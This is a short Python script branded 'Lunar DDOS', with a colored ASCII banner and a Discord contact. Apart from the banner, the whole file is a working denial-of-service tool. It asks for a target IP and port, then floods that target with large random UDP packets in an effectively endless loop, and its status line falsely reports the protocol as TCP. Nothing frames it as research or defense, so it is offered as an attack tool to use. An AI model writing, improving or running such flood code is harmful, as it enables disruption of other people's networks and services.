import socket, random, time
import pystyle
from pystyle import *
import termcolor
from colorama import Fore, init
from sys import stdout


def title():
    stdout.write("                                                                                          \n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"             ╦  ╦ ╦╔╗╔╔═╗╦═╗  ╔╦╗╔╦╗╔═╗╔═╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"             ║  ║ ║║║║╠═╣╠╦╝   ║║ ║║║ ║╚═╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX            +"             ╩═╝╚═╝╝╚╝╩ ╩╩╚═  ═╩╝═╩╝╚═╝╚═╝\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╔═════════════════════════════════════════════════════╗\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"             Welcome To The Lunar DDOS  "+Fore.LIGHTCYAN_EX  +"            ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"          Type [help] to see the Commands   "+Fore.LIGHTCYAN_EX +"        ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"║ "+Fore.LIGHTWHITE_EX   +"       Discord - Brigade Anti-420 !!#1418   "+Fore.LIGHTCYAN_EX +"        ║\n")
    stdout.write("             "+Fore.LIGHTCYAN_EX+"╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
    
    

Cyan = '\033[96m'
Green = '\033[92m'


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 


def attack():
    ip = input("Enter Target IP: ")
    port = int(input("Enter Target Port: "))
    sleep = float(input("Sleep: "))
    s.connect((ip, port))    
    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Connected to : {ip} Sent: {i}: protocol=TCP port={port}")
        time.sleep(sleep)


def main():
    System.Size(80,40)
    title()
    attack()
main()
